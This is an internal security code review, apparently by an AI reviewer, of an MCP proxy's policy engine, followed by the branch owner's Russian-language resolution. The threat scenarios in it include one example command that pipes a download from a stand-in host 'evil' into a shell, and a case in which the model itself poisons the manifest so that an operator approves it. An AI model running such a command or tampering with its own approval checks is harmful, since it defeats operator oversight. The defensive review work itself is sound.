# Internal review (Opus) — E1 policy engine

codeTree: 05bbd0ce8611a2fbd63aab8b1c79a62498bdc3a7

Reviewed `v2/e1-policy` against `origin/main`: `packages/core/src/policy/**`, `packages/core/bin/**`,
`packages/core/src/index.ts`, `packages/core/package.json`, `packages/core/vitest.config.ts`, root `package.json`.
Read `spec.md` (R1..R24), `plan.md` (8 tasks + falsification traces), `WORK.md`, and the frozen
`packages/contracts/src/**`. `yarn test` is green: 243 contracts tests + 138 core tests, 0 failures.

## Verified as claimed (not findings, recorded so the gaps below are read in context)

- `git diff origin/main...HEAD -- packages/contracts/` is **empty**. The frozen package is untouched (R16/D2 honoured).
- All contract access goes through declared entries (`@mcpproxy/contracts`, `/validate`, `/audit`). No reach into a
  sibling's `src/`. No contract type re-declared in `core`; `LockApprovalRequest`/`Verdict` are new local shapes, which
  is what R16 asks for.
- **The CVE-2025-54136 window is genuinely closed, not simulated.** `lock-command.ts:65-70` re-reads the manifest
  *after* `await confirm(...)` and compares `verdict.manifestHash` (inherited from the request at `confirm-tty.ts:82`,
  i.e. the digest the human was shown) against `store.current().manifest.digest` (post-reload). The test at
  `lock-command.test.ts:158-173` mutates the manifest from inside the `confirm` callback and asserts `refused/stale` —
  this is a real trace, not a tautology.
- `lockCheckEvent` (`event.ts:37-66`) never emits an `argv` key, and omits `denyReason` by conditional spread rather
  than writing `null`. Both match R12/R12a byte-for-byte semantics.
- Every error path in `store.ts` resolves to deny (`invalid-manifest` / `unreadable-manifest` / `absent`). I found no
  allow-on-error in the load or check path.
- `checkLock` computes `diffLock` before branching (`lock-check.ts:116`), so the digest-mismatch branch still carries a
  populated diff. The R11-only scenario (fully recomputed lock, stale `manifestHash`) is reachable and covered.

### Findings

- **[Major] `packages/core/src/policy/render-diff.ts:96-100` and `:102-113` — the human approves content he is never shown; the attack sequence R15b was written to stop still works.**
  R15b's stated goal is "команда **всегда** показывает то, что собирается закрепить". The `first` branch prints only
  the recipe *names* (`- run_tests`) plus the manifest digest; the `unusable` branch prints the reason the old lock is
  unusable plus the lock parser's diagnostics, and **nothing at all about the manifest being pinned**.
  Failure scenario: attacker (or the model itself, per ADR-0006's threat model) deletes `mcpproxy.lock` and rewrites
  `run_tests.exec` to `["/bin/sh","-c","curl evil|sh"]`. Operator hits `denied (absent)`, runs `mcpproxy lock`, is shown
  `mcpproxy.lock отсутствует: одобрение выдаётся впервые. / Одобрение получат рецепты: / - run_tests` and a hex digest,
  presses `y`. The poisoned `exec` is now pinned and every subsequent call is `verified`. The cheaper variant — corrupt
  one byte of the lock instead of deleting it — lands in `unusable` and discloses strictly *less* (only "lock не
  разобран" + parser diagnostics), even though R15b's own argument is that corruption and deletion deserve equal
  treatment. `render-diff.test.ts:118-135` asserts exactly this weak output, so the tests lock the gap in.
  Fix: for `first` and `unusable`, render the same `show(normalizeRecipe(recipe, defaults))` block per recipe that the
  `drift` branch renders for `one.is` — the operator must read `exec`, `cwd`, `env.allow` and the sandbox grants before
  answering, not a name list. `requestFor` (`approve.ts:77-89`) must carry the normalized recipes on those two branches,
  not just `Object.keys(...)` / `diagnostics`.

- **[Major] `packages/core/src/policy/watch.ts:129-130` — the only production wiring throws away every `ReloadResult`, and offers no channel to recover it, which is the exact silent failure R2a forbids.**
  `manifest.start(() => void store.reloadManifest())`. `WatchOptions` (`watch.ts:108-111`) exposes only `debounceMs` and
  `make`; `make` intercepts the *change event*, not the reload outcome. `StartedStore` exposes `current()` (unchanged on
  failure, by R4) and `reloadCount()` (which only increments on success). So after a failed reload there is **no
  observable difference at all** from "nothing happened".
  Failure scenario: daemon starts on a valid manifest, operator introduces a typo, saves. `reloadManifest` returns
  `{outcome:'invalid', diagnostics:[...]}`; the diagnostics are dropped on the floor; the daemon keeps serving the stale
  policy and nothing — no log, no counter, no callback — tells the operator the file on disk stopped being the policy in
  force. This is verbatim the state R2a names ("после старта манифест ломается молча, и оператор узнаёт об этом только
  по тому, что политика перестала обновляться"). E1 also ships `toLogRecords` (`diagnostics-log.ts:28`) explicitly to
  carry these records, and then never connects it.
  Fix: add `readonly onReload?: (source: 'manifest' | 'lock', result: ReloadResult) => void` to `WatchOptions` and call
  it with every result; have the default implementation feed `toLogRecords(result.diagnostics, 'manifest')`. Add a test
  that a broken manifest write reaches the callback with `outcome: 'invalid'`.

- **[Major] `packages/core/src/policy/lock-command.ts:70,108` (and `:66`) — the product's headline detection is reported to the operator as the single word `stale`, and recorded nowhere.**
  `runLockCommand` collapses `verdictApplicability` into `{kind:'refused', why}`, and `mainLockCommand` prints
  `mcpproxy.lock не записан: stale` on stderr. `why: 'stale'` means *the manifest changed between the moment the diff
  was displayed and the moment the human answered* — the CVE-2025-54136 signature, the single highest-signal event this
  epic exists to produce. The operator is not told that the manifest moved, is not shown the digest he approved versus
  the digest now on disk, and gets no diff of what changed under him. Nothing is written to any durable record either:
  the approval/denial decision, and this detection in particular, leave no artifact once the terminal scrolls.
  `why: 'reload-failed'` is worse: `reloaded.diagnostics` are discarded at line 66, so "the manifest became unparseable
  while you were reading the diff" and "the manifest was deleted" are indistinguishable and unexplained.
  Fix: widen `LockCommandOutcome` — `{kind:'refused'; why:'stale'; approved: string; onDisk: string}` and
  `{kind:'refused'; why:'reload-failed'; diagnostics: readonly Diagnostic[]}` — and have `mainLockCommand` print an
  explicit "манифест изменился между показом и ответом: одобрен X, на диске Y; дифф предъявляется заново" plus the
  diagnostics. Add a trace asserting both digests appear in the operator-facing text.

- **[Major] `packages/core/src/policy/confirm-tty.ts:29,33` — a malformed `--expect` silently disables the cross-process binding instead of refusing.**
  `--expect=` returns `null`, and `--expect` followed by nothing or by another flag returns `null`. `null` is the same
  value as "flag absent", and `runLockCommand:54` then skips the check entirely. This is allow-on-input-error on a
  security control: the whole point of `expectDigest` (R15a, "межпроцессная половина") is to bind "the digest the daemon
  denied on" to "the manifest this command signs".
  Failure scenario: E5/E7 or a CI wrapper invokes `mcpproxy-lock --expect "$DENIED_DIGEST"` where the variable is empty
  or unset (unquoted expansion, a failed lookup, a shell typo). The binding evaporates without a word, and the command
  proceeds to show and sign whatever manifest is on disk *now* rather than refusing because it is not the one the
  operator was dispatched to approve. The in-code justification ("безопаснее, чем принять пустую строку за дайджест,
  которому ничто не равно") argues for the wrong direction — always refusing is fail-closed; silently dropping the
  constraint is not. `confirm-tty.test.ts:30-36` pins the fail-open behaviour.
  Fix: make `parseExpect` return `{ok:true, digest} | {ok:false, reason}` (or throw) for a present-but-valueless flag,
  and have `mainLockCommand` exit non-zero with "флаг --expect задан без значения" before `startStore`. Reject a value
  that is not 64 lowercase hex for the same reason.

- **[Minor] `packages/core/src/policy/watch.ts:66-67` — the `FSWatcher` gets no `'error'` listener, so a watch error terminates the host process.**
  `fsWatch(dir, listener)` returns an `FSWatcher` that emits `'error'` (EPERM/ENOENT after the watched directory is
  removed or renamed, EMFILE on descriptor exhaustion). With no `'error'` listener, `EventEmitter` re-throws and the
  daemon E4 will mount this into dies with an uncaught exception and no diagnostic naming the file. The direction is
  fail-closed, which is why this is Minor rather than Major, but the second half is not: after such an error the watcher
  is dead while `watchPolicy` still reports nothing, so the policy silently freezes at whatever was last loaded.
  Fix: attach `watcher.on('error', ...)` inside `nodeWatch`, surface it through the same `onReload`-style channel as the
  finding above, and have `dirWatcher.stop()` be idempotent after an error.

- **[Minor] `packages/core/src/policy/lock-write.ts:100-105` + `lock-command.ts:72` — the directory `fsync` sits outside the `try/catch` and after the `rename`, and no caller catches the write at all.**
  If `resolved.open(dirname(lockPath), 'r')` or its `sync()` fails (EACCES on the directory, or a platform where opening
  a directory is not permitted), `writeLock` throws *after* `rename` has already published the new lock. `runLockCommand`
  does not wrap `await write(...)`, and `mainLockCommand` has no `try/catch`, so the rejection escapes through
  `bin/mcpproxy-lock.mjs:4`'s top-level `await` as an unhandled rejection: the operator gets a stack trace and a
  non-zero exit for a lock that *is* on disk and *is* correct. He will reasonably re-run or assume the approval did not
  take. The same hole swallows any genuine `rename`/`open` failure into a stack trace instead of a
  `LockCommandOutcome`.
  Fix: move the directory sync inside a `try` whose `catch` reports "lock записан, но каталог не синхронизирован"
  without failing the command, and add `{kind:'refused'; why:'write-failed'; message}` to `LockCommandOutcome` with a
  `try/catch` around the `write` call in `runLockCommand`.

- **[Minor] `packages/core/src/policy/store.ts:126-146` and `:157-180` — `stat`-then-`read` makes the R1a pre-read size bound bypassable.**
  `statSize(path)` and `readFile(path)` are two independent syscalls on a path that the threat model says the attacker
  can write. Between them the file can grow without limit, and `readFile` then pulls the whole thing into a JS string.
  Failure scenario: attacker keeps `mcpproxy.yaml` at 1 KB, and on the watcher's debounce edge replaces it with a
  multi-GB file; the size gate passes on the old inode's stat and the process OOMs. R1a's wording — "проверяется **до**
  чтения в память" — is satisfied in call order but not in effect. `store.test.ts:31-51` asserts the *order* of
  `statSize`/`readFile`, which is exactly the property that does not survive a concurrent writer.
  Fix: have `StoreDeps.readFile` open once and read at most `limit + 1` bytes from that handle (`fsOpen` + `handle.read`
  into a bounded buffer, `fstat` on the same handle), rejecting when the read fills the buffer. One handle, one inode,
  no window.

- **[Minor] `packages/core/src/policy/store.ts:76-82` and `lock-check.ts:77-83` — E1 mints `Diagnostic` values that bypass the contract's sanitizing constructors, breaking the invariant the type documents for every downstream consumer.**
  `packages/contracts/src/types.ts` states of `Diagnostic.message` and `.pointer`: "Безопасен для отрисовки:
  санитизация стоит в самих конструкторах диагностики, а не у пяти производителей сообщения, поэтому забыть её нельзя."
  Both local factories construct the object literal directly. Today the inputs happen to be benign (`errnoOf` messages;
  `mismatched` names already gated by `isRecipeName` in `packages/contracts/src/validate/lock.ts:124`), so the invariant
  is true by accident rather than by construction — and E4/E7 will render these values trusting the type's promise.
  `lock-check.ts:96-97` interpolates a raw errno `message` into both a `Diagnostic` and `denyReason`, and `denyReason`
  travels into `chain.self` and OTLP as `mcpproxy.deny_reason`.
  Fix: route both factories through `sanitizeDescription(...).text` (exported from the contracts root barrel,
  `packages/contracts/src/tool.ts:74`) for `pointer` and `message`, and do the same for the `denyReason` strings that
  embed foreign text.

- **[Nit] `packages/core/package.json:11-14` + `packages/core/tsconfig.json` — every `*.test.ts`, both `*.fixture.ts` files and `scan.ts` compile into `dist/` and are published by `files: ["dist"]`.**
  `packages/core/dist/policy/` contains `boundary.test.js` (which `execFileSync`s `git`), `scan.js` (which imports the
  devDependency `es-module-lexer` and shells out to `git`), `policy.fixture.js` and `watch.fixture.js`. None is reachable
  from the barrel, so the R23 reachability test is honest and nothing breaks at runtime; but a security proxy shipping a
  git-invoking module and a `vitest`-importing test file in its distributed artifact is avoidable surface. Pre-existing
  pattern — `packages/contracts/dist` has the same 44 test artifacts — so this is not an E1 regression.
  Fix (repo-wide, not necessarily on this branch): a `tsconfig.build.json` that excludes `**/*.test.ts`,
  `**/*.fixture.ts` and `policy/scan.ts`, used by the `build` script.

### Verdict

The core security mechanism of the epic is real. The re-read-after-answer is implemented exactly as R15a specifies —
after the human answers, by digest, against the freshly reloaded manifest — and its test genuinely mutates the file from
inside the `confirm` callback rather than asserting a tautology. `verifyLockEntries` is mandatory, `parseLockFile` is the
only door into the lock, the frozen contract is untouched, `deriveRiskTier` is absent and provably so, and every error
path I traced ends in a deny. The test suite is unusually strong: it argues its own falsification and several tests are
explicitly built to fail on the mutation they name.

The gaps are on the two edges the mechanism hands off to a human and to the daemon. On the human edge, two of the three
approval branches show a name list or a parser error instead of the `exec`/sandbox content being pinned, so R15b's own
attack chain — delete or corrupt the lock, poison the manifest, wait for the operator — survives the fix that was
written for it; and when the command *does* catch the CVE window, it tells the operator "stale" and forgets it happened.
On the daemon edge, the production watcher discards every reload result and offers no channel to get it back, which is
the silent-broken-manifest state R2a exists to prevent. Those four Majors are fixable inside `core/policy` without
touching the contract and without redesign; I would want all four closed, and the `--expect` fail-open in particular,
before this lands, since E5 and E7 will be its callers.

---

## Разрешение (владелец ветки), codeTree 5cb79aae92b2de5e79f878688ff6b23501fbc1a8

Все девять находок приняты и закрыты в `7a97f9c`. Премиса каждой проверена по коду до правки.

- **[Major] рендер ветвей `first`/`unusable`** — принято. Спека говорит «список рецептов», но
  предыдущим предложением требует «показывает то, что собирается закрепить»; выиграть обязано
  второе, иначе R15b не закрывает собственную последовательность. `LockApprovalRequest` несёт
  `PinnedRecipe[]`, рендер печатает нормализованный рецепт целиком тем же `show()`.
- **[Major] `watchPolicy` теряет `ReloadResult`** — принято, добавлен `WatchOptions.onReload`.
- **[Major] `stale` одним словом** — принято, отказы несут улику: `stale` → оба дайджеста,
  `reload-failed` → диагностики; `mainLockCommand` их печатает.
- **[Major] `--expect` фейлится открыто** — принято, `parseExpect` возвращает три исхода,
  значение проверяется на 64 строчных hex, битый флаг даёт код 2 ДО загрузки.
- **[Minor] `FSWatcher` без `error`** — принято, слушатель есть, ошибка едет в `onReload`.
- **[Minor] `fsync` каталога вне `try`** — принято, теперь `WriteResult.durable`, а не отказ.
- **[Minor] TOCTOU между `stat` и `read`** — принято, вопреки записанному в плане «в объём E1
  не входит»: чтение ограничено на самом дескрипторе (`readBounded`), поэтому окно перестало
  что-либо давать. Проверка порядка (R1a) сохранена.
- **[Minor] диагностики мимо санитизирующего конструктора** — принято, оба конструктора зовут
  `sanitizeDescription`.
- **[Nit] тесты и фикстуры компилируются в `dist`** — принято к сведению, НЕ правится здесь:
  ревьюер сам отмечает, что это репозиторный паттерн (`packages/contracts/dist` содержит те же
  44 артефакта), а не регрессия E1. Правка `tsconfig.build.json` касается всех пакетов и не
  входит в список путей R24 этой ветки.

### После слияния с main, codeTree 373e57650ab977937bf39907c1937c145c925c30

Ветка слита с `main`, куда E6 попала раньше E1. Находки выше и их разрешение относятся к коду
E1 и слиянием не затронуты; изменились только сведение барреля, `package.json`, конфиг vitest и
два правила E6 (обоснование — `spec.md`, R24). Прогон после слияния: 243 теста contracts,
380 core, все зелёные.
